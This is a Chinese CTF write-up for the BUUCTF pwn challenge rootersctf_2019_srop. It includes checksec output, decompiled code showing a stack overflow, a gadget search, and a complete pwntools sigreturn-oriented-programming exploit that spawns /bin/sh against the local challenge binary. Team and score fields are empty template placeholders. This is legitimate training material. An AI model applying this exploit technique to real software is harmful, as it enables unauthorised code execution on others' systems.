# [个人队伍] BUUCTF2026的Writeup

> **2026年00月00日00:00 ~ 2026年00月00日00:00**
>
> **比赛地址：https://buuoj.cn/challenges**
>
> **复现地址：https://buuoj.cn/challenges**

> 官方简介



# Challenges



## Pwn



### rootersctf_2019_srop

#### 题目介绍

> Ubuntu18.04

---

#### 解题过程

##### 1. 信息搜集

```shell
checksec pwn
```

```shell
[*] '/home/kali/Desktop/ctf/pwn/sropbuuctf/pwn'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

##### 2. 查看源码

```c
void __noreturn start()
{
  signed __int64 v0; // rax

  sub_401000();
  v0 = sys_exit(0);
}
```

```c
signed __int64 sub_401000()
{
  signed __int64 v0; // rax
  char buf[128]; // [rsp+0h] [rbp-80h] BYREF

  v0 = sys_write(1u, ::buf, 0x2Au);
  return sys_read(0, buf, 0x400u);
}
```

##### 3. 数据搜集

```assembly
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/sropbuuctf]
└─$ ropper -f pwn --search "pop rax; syscall"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rax; syscall

[INFO] File: pwn
0x0000000000401032: pop rax; syscall; 
0x0000000000401032: pop rax; syscall; leave; ret;
```

```assembly
.data:0000000000402000
```

##### 4. 编写脚本

```python
from pwn import *

context.os = "linux"
context.arch = "amd64"
context.log_level = "debug"

# r = remote("xxx", xxx)
r = process(["./pwn"])

elf = ELF("./pwn")
rop = ROP([elf])

gdb.attach(r, """
b *0x40101F
""")

syscall_leave_ret_elf_addr = rop.find_gadget(["syscall", "leave", "ret"])[0]
pop_rax_syscall_leave_ret_elf_addr = rop.find_gadget(["pop rax", "syscall", "leave", "ret"])[0]

data_elf_addr = 0x402000

frame = SigreturnFrame(kernel="amd64")
frame.rax = 0
frame.rdi = 0
frame.rsi = data_elf_addr
frame.rdx = 0x400
frame.rip = syscall_leave_ret_elf_addr
frame.rbp = data_elf_addr

payload = cyclic(0x80)
payload += p64(0xdeadbeef)
payload += p64(pop_rax_syscall_leave_ret_elf_addr)
payload += p64(15)
payload += bytes(frame)
r.sendafter(b"CTF?", payload)

sleep(2)

frame = SigreturnFrame(kernel="amd64")
frame.rax = 59
frame.rdi = data_elf_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_leave_ret_elf_addr

payload = b"/bin/sh\x00" + p64(pop_rax_syscall_leave_ret_elf_addr) + p64(15) + bytes(frame)
r.send(payload)

r.interactive()
r.close()
```

```shell
cat flag
flag{...}
```

---

#### 题目答案

##### 脚本

```python
脚本如上
```

##### Flag

```flag
flag{...}
```



# 队伍

## 名称

**暂无**



## 口号

**暂无**



## 成员

### 队长

- **probie**

### 队员

- **暂无**



## 留言

### probie

- **暂无**



## 成果

### 排名

- **0 / ?**

### 解题

- **0 / ?**

### 分数

- **0 / ?**